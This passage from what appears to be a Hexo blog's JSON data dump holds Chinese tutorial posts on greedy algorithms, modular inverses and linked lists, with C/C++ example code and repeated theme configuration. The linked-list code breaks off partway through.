rverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":2375,"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>先奉上一段千古名句：<br><strong>模拟只会猜题意，贪心只能过样例。<br>数学上来先打表，DP一般看规律。<br>组合数学靠运气，计算几何瞎暴力。<br>图论一顿套模板，数论只会GCD。</strong><br>","more":"</p>\n<h1 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h1><p>&emsp;&emsp;所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，他所做出的仅是在某种意义上的<font color=red>局部最优解</font>。<br>&emsp;&emsp;贪心算法没有固定的算法框架，算法设计的关键是贪心策略的选择。必须注意的是，贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关。<br>&emsp;&emsp;<font color=red>所以对所采用的贪心策略一定要仔细分析其是否满足无后效性。</font></p>\n<h1 id=\"基本要素\"><a href=\"#基本要素\" class=\"headerlink\" title=\"基本要素\"></a>基本要素</h1><p>一、<strong>贪心选择性质</strong><br>&emsp;&emsp;所谓贪心选择性质是指所求问题的总体最优解能够通过一系列局部最优的选择，换句话说，当考虑做何种选择的时候，我们仅仅考虑对当前问题最佳的选择而不考虑子问题的结果。这是贪心算法可行的第一个基本要素。贪心算法以迭代的方式作出相继的贪心选择，每作一次贪心选择就将所求问题简化为规模更小的子问题。<br>&emsp;&emsp;对于一个详细问题，要确定它是否具有贪心选择性质，必须证明每一步所作的贪心选择最终导致问题的总体最优解。<br>二、<strong>最优子结构性质</strong><br>&emsp;&emsp;当一个问题的最优解包括其子问题的最优解时，称此问题具有最优子结构性质。问题的最优子结构性质是该问题可用贪心算法求解的关键特征。</p>\n<h1 id=\"基本思路\"><a href=\"#基本思路\" class=\"headerlink\" title=\"基本思路\"></a>基本思路</h1><pre><code>1、建立数学模型来描述问题。\n2、把求解的问题分成若干个子问题。\n3、对每一子问题求解，得到子问题的局部最优解。\n4、把子问题的解局部最优解合成原来解问题的一个解。\n</code></pre><h1 id=\"贪心法正确性证明\"><a href=\"#贪心法正确性证明\" class=\"headerlink\" title=\"*贪心法正确性证明\"></a>*贪心法正确性证明</h1><p>&emsp;&emsp;贪心法的正确性证明是个难点，尤其是在非常有限的竞赛时间内。所以，很多选手往往是大胆假设自己选择的贪心策略是正确的，这样难免会出错，但也是一种不得已而为之的办法。其实贪心法的证明虽然不容易，但一些常见的方法还是值得总结的。<br>&emsp;&emsp;当一个贪心算法不能确定其100%正确，使用之前就应该尝试证明它的不正确性。而要证明其不正确，一种最简单的方法就是举一个反例。</p>\n<h1 id=\"举例\"><a href=\"#举例\" class=\"headerlink\" title=\"举例\"></a>举例</h1><h2 id=\"独木舟\"><a href=\"#独木舟\" class=\"headerlink\" title=\"独木舟\"></a>独木舟</h2><p>题目链接：<a href=\"https://www.51nod.com/Challenge/Problem.html#!#problemId=1432\">https://www.51nod.com/Challenge/Problem.html#!#problemId=1432</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tlong long N,M;</span><br><span class=\"line\">\tlong long a[10020];</span><br><span class=\"line\">\tcin&gt;&gt;N&gt;&gt;M;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;N;i++)</span><br><span class=\"line\">\t\tcin&gt;&gt;a[i];</span><br><span class=\"line\">\tsort(a,a+N);</span><br><span class=\"line\">\tlong long l&#x3D;0,r&#x3D;N-1,ans&#x3D;0;</span><br><span class=\"line\">\twhile(l&lt;&#x3D;r)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(a[l]+a[r]&lt;&#x3D;M)</span><br><span class=\"line\">\t\t\tl++;</span><br><span class=\"line\">\t\tr--;</span><br><span class=\"line\">\t\tans++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout&lt;&lt;ans&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"聪明的木匠\"><a href=\"#聪明的木匠\" class=\"headerlink\" title=\"聪明的木匠\"></a>聪明的木匠</h2><p>题目链接：<a href=\"https://www.51nod.com/Challenge/Problem.html#!#problemId=1117\">https://www.51nod.com/Challenge/Problem.html#!#problemId=1117</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint N,t,res,ans&#x3D;0;</span><br><span class=\"line\">\tcin&gt;&gt;N;</span><br><span class=\"line\">\tpriority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt; &gt;Q;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcin&gt;&gt;t;</span><br><span class=\"line\">\t\tQ.push(t);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\twhile(Q.size()&gt;1)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tres&#x3D;Q.top();</span><br><span class=\"line\">\t\tQ.pop();</span><br><span class=\"line\">\t\tres+&#x3D;Q.top();</span><br><span class=\"line\">\t\tQ.pop();</span><br><span class=\"line\">\t\tQ.push(res);</span><br><span class=\"line\">\t\tans+&#x3D;res;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout&lt;&lt;ans&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"不重叠的线段\"><a href=\"#不重叠的线段\" class=\"headerlink\" title=\"不重叠的线段\"></a>不重叠的线段</h2><p>题目链接：<a href=\"https://www.51nod.com/Challenge/Problem.html#!#problemId=1133\">https://www.51nod.com/Challenge/Problem.html#!#problemId=1133</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;bits&#x2F;stdc++.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">struct demo&#123;int l,r;&#125;line[10020];</span><br><span class=\"line\">bool cmp(demo a,demo b)&#123;return a.r&lt;b.r;&#125;</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint N,ans&#x3D;1;</span><br><span class=\"line\">\tcin&gt;&gt;N;</span><br><span class=\"line\">\tfor(int i&#x3D;0;i&lt;N;i++)</span><br><span class=\"line\">\t\tcin&gt;&gt;line[i].l&gt;&gt;line[i].r;</span><br><span class=\"line\">\tsort(line,line+N,cmp);</span><br><span class=\"line\">\tdemo t&#x3D;line[0];</span><br><span class=\"line\">\tfor(int i&#x3D;1;i&lt;N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif(t.r&lt;&#x3D;line[i].l)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tans++;</span><br><span class=\"line\">\t\t\tt&#x3D;line[i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tcout&lt;&lt;ans&lt;&lt;endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"逆元","date":"2019-03-29T09:11:09.000Z","abbrlink":"64311e43","updated":"2020-05-11T09:45:28.706Z","_content":"# 原理\n未完待续\n# 题目\n未完待续\n<!--more-->\n# 代码\n```cpp\nll exgcd(ll a,ll b,ll &x,ll &y)\n{\n    if(b==0)\n    {\n        x=1,y=0;\n        return a;\n    }\n    else\n    {\n        ll res=exgcd(b,a%b,y,x);\n        y-=x*(a/b);\n        return res;\n    }\n}\nll inv(ll a,ll n)\n{\n    ll x,y;\n    exgcd(a,n,x,y);\n    return (x%n+n)%n;\n}\n```","source":"_posts/逆元.md","raw":"---\ntitle: 逆元\ndate: 2019-03-29 17:11:09\ncategories:\n  - Algorithm\ntags:\n  - 逆元\nabbrlink: '64311e43'\nupdated:\n---\n# 原理\n未完待续\n# 题目\n未完待续\n<!--more-->\n# 代码\n```cpp\nll exgcd(ll a,ll b,ll &x,ll &y)\n{\n    if(b==0)\n    {\n        x=1,y=0;\n        return a;\n    }\n    else\n    {\n        ll res=exgcd(b,a%b,y,x);\n        y-=x*(a/b);\n        return res;\n    }\n}\nll inv(ll a,ll n)\n{\n    ll x,y;\n    exgcd(a,n,x,y);\n    return (x%n+n)%n;\n}\n```","slug":"逆元","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkeb0046qse521hn6ydz","content":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>未完待续</p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>未完待续<br><a id=\"more\"></a></p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">ll <span class=\"title\">exgcd</span><span class=\"params\">(ll a,ll b,ll &amp;x,ll &amp;y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b==<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        x=<span class=\"number\">1</span>,y=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> a;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ll res=exgcd(b,a%b,y,x);</span><br><span class=\"line\">        y-=x*(a/b);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">ll <span class=\"title\">inv</span><span class=\"params\">(ll a,ll n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    ll x,y;</span><br><span class=\"line\">    exgcd(a,n,x,y);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (x%n+n)%n;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":250,"excerpt":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>未完待续</p>\n<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p>未完待续<br>","more":"</p>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">ll <span class=\"title\">exgcd</span><span class=\"params\">(ll a,ll b,ll &amp;x,ll &amp;y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(b==<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        x=<span class=\"number\">1</span>,y=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> a;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ll res=exgcd(b,a%b,y,x);</span><br><span class=\"line\">        y-=x*(a/b);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">ll <span class=\"title\">inv</span><span class=\"params\">(ll a,ll n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    ll x,y;</span><br><span class=\"line\">    exgcd(a,n,x,y);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (x%n+n)%n;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"链表","date":"2019-03-29T09:11:09.000Z","abbrlink":"2362a8ea","updated":"2020-04-08T10:40:24.000Z","_content":"# 链表\n{% blockquote 百度百科 https://baike.baidu.com/item/%E9%93%BE%E8%A1%A8/9794473?fr=aladdin 链表 %}\n链表是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。每个结点包括两个部分：一个是存储数据元素的数据域，另一个是存储下一个结点地址的指针域。 相比于线性表顺序结构，操作复杂。由于不必须按顺序存储，链表在插入的时候可以达到O(1)的复杂度，比另一种线性表顺序表快得多，但是查找一个节点或者访问特定编号的节点则需要O(n)的时间，而线性表和顺序表相应的时间复杂度分别是O(logn)和O(1)。\n\n使用链表结构可以克服数组链表需要预先知道数据大小的缺点，链表结构可以充分利用计算机内存空间，实现灵活的内存动态管理。但是链表失去了数组随机读取的优点，同时链表由于增加了结点的指针域，空间开销比较大。链表最明显的好处就是，常规数组排列关联项目的方式可能不同于这些数据项目在记忆体或磁盘上顺序，数据的存取往往要在不同的排列顺序中转换。链表允许插入和移除表上任意位置上的节点，但是不允许随机存取。链表有很多种不同的类型：单向链表，双向链表以及循环链表。链表可以在多种编程语言中实现。像Lisp和Scheme这样的语言的内建数据类型中就包含了链表的存取和操作。程序语言或面向对象语言，如C,C++和Java依靠易变工具来生成链表。\n{% endblockquote %}\n<!--more-->\n# 代码\n```cpp\n#include <stdio.h>\n#include <stdlib.h>\ntypedef int ElemType;\ntypedef struct Node {\n    ElemType data;\n    struct Node *next;\n}Node,*LinkedList;\nLinkedList LinkedListInit() {\n    Node *L;\n    L = (Node *)malloc(sizeof(Node));\n    if(L == NULL) {\n        printf(\"申请内存空间失败\\n\");\n    }\n    L->next = NULL;\n \treturn L;\n}\nLinkedList LinkedListCreatH_pre() {\n    Node *L,*t;\n    t = L = (Node *)malloc(sizeof(Node));\n    ElemType x;\n    while(scanf(\"%d\",&x) != EOF) {\n        Node *p;\n        p = (Node *)malloc(sizeof(Node));\n        p->data = x;\n        t->next = p;\n        p->next=NULL;\n        t = t->next;\n    }\n    return L;\n}\nLinkedList LinkedListCreatH_back() {\n    Node *L;\n    L = (Node *)malloc(sizeof(Node));\n    L->next = NULL;\n    ElemType x;\n    while(scanf(\"%d\",&x) != EOF) {\n        Node *p;\n        p = (Node *)malloc(sizeof(Node));\n        p->data = x;\n        p->next = L->next;\n        L->next = p;\n    }\n    return L;\n}\nLinkedList LinkedListInsert(LinkedList L,int i,ElemType x) {\n    Node *pre=L;\n    int tempi = 0;\n    for (tempi = 1; tempi < i; tempi++) {\n    \tpre = pre->next;\n\t}\n    Node *p;\n    p = (Node *)malloc(sizeof(Node));\n    p->data = x;\n    p->next = pre->next;\n    pre->next = p;\n    return L;\n}\nLinkedList LinkedListFind(LinkedList L,ElemType x)\n{\n    int i=1;\n    Node *p=L->next;\n    while(p->data != x) {\n        if(p->next==NULL)\n        {\n            printf(\"没有此数！\\n\");\n            return L;\n        }\n        p = p->next;\n        i++;\n    }\n    printf(\"%d位于第%d个位置！\\n\",x,i);\n    return L;\n}\nLinkedList LinkedListDelete(LinkedList L,ElemType x)\n{\n    Node *p,*pre=L;\n    p = L->next;\n    while(p->data != x) {\n        if(p->next==NULL)\n        {\n            printf(\"没有此数！\\n\");\n            return L;\n        }\n        pre = p;\n        p = p->next;\n    }\n    pre->next = p->next;\n    free(p);\n    return L;\n}\nvoid menu()\n{\n\tprintf(\"1.输入(前插)\\n\");\n\tprintf(\"2.输入(后插)\\n\");\n\tprintf(\"3.插入数据\\n\");\n\tprintf(\"4.查找数据\\n\");\n\tprintf(\"5.删除数据\\n\");\n\tprintf(\"0.退出程序\\n\");\n}\nint main()\n{\n    LinkedList list,start;\n    int choice;\n    